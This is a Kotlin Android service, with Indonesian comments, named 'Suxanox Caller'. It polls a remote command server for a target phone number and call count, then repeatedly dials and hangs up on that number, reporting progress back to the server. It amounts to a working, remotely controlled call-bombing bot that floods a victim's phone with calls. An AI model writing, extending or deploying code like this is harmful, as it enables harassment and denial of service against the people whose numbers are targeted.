package com.suxanox.caller

import android.app.*
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.KeyEvent
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class CallerService : Service() {
    private val client = OkHttpClient()
    private val handler = Handler(Looper.getMainLooper())
    private var baseUrl = ""
    private var apiKey = ""
    private var isRunning = false
    
    // 🔥 VARIABEL BUAT STOP CALL
    private var isCalling = false 
    private var callRunnable: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        baseUrl = intent?.getStringExtra("BASE_URL") ?: return START_NOT_STICKY
        apiKey = intent?.getStringExtra("API_KEY") ?: return START_NOT_STICKY
        
        val notification = NotificationCompat.Builder(this, "CALLER_CHANNEL")
            .setContentTitle("Suxanox Caller Aktif")
            .setContentText("Standby menerima perintah...")
            .setSmallIcon(android.R.drawable.ic_menu_call)
            .build()
        
        startForeground(1, notification)
        isRunning = true
        startPolling()
        return START_STICKY
    }

    private fun startPolling() {
        if (!isRunning) return
        
        val request = Request.Builder()
            .url("$baseUrl/get-command")
            .addHeader("x-api-key", apiKey)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                handler.postDelayed({ startPolling() }, 5000)
            }

            override fun onResponse(call: Call, response: Response) {
                response.body?.string()?.let { body ->
                    try {
                        val json = JSONObject(body)
                        if (json.getString("status") == "ok") {
                            val data = json.getJSONObject("data")
                            val action = data.optString("action", "call")
                            
                            if (action == "stop") {
                                // 🔥 HENTIKAN CALL
                                stopCallLoop()
                                sendReport("0", "Dihentikan Paksa")
                            } else {
                                val target = data.getString("target")
                                val count = data.getInt("count")
                                startCallLoop(target, count)
                                sendReport(target, "Sedang Menelepon")
                            }
                        }
                    } catch (e: Exception) {}
                }
                handler.postDelayed({ startPolling() }, 3000)
            }
        })
    }

    // 🔥 FUNGSI BARU BUAT STOP LOOP
    private fun stopCallLoop() {
        isCalling = false
        callRunnable?.let { handler.removeCallbacks(it) }
        
        // Tutup telepon yang lagi jalan
        val endCall = Intent(Intent.ACTION_MEDIA_BUTTON)
        endCall.putExtra(Intent.EXTRA_KEY_EVENT, KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENDCALL))
        sendOrderedBroadcast(endCall, null)
    }

    private fun sendReport(target: String, status: String) {
        val json = JSONObject()
        json.put("target", target)
        json.put("status", status)
        
        val body = RequestBody.create(MediaType.parse("application/json"), json.toString())
        val request = Request.Builder()
            .url("$baseUrl/report")
            .addHeader("x-api-key", apiKey)
            .post(body)
            .build()
            
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }

    private fun startCallLoop(target: String, maxCount: Int) {
        // Matiin loop lama kalau ada
        stopCallLoop()
        
        isCalling = true
        var current = 0
        
        callRunnable = object : Runnable {
            override fun run() {
                // 🔥 CEK APAKAH MASIH BOLEH NELFON
                if (!isCalling || current >= maxCount) {
                    sendReport(target, "Selesai / Dihentikan")
                    return
                }
                current++
                
                val callIntent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$target")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                
                if (ContextCompat.checkSelfPermission(this@CallerService, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    startActivity(callIntent)
                }

                handler.postDelayed({
                    if (!isCalling) return@postDelayed // Cek lagi kalau di-stop pas nelfon
                    
                    val endCall = Intent(Intent.ACTION_MEDIA_BUTTON)
                    endCall.putExtra(Intent.EXTRA_KEY_EVENT, KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENDCALL))
                    sendOrderedBroadcast(endCall, null)
                    
                    handler.postDelayed(this, 5000)
                }, 10000)
            }
        }
        handler.post(callRunnable!!)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("CALLER_CHANNEL", "Caller Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        isRunning = false
        stopCallLoop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
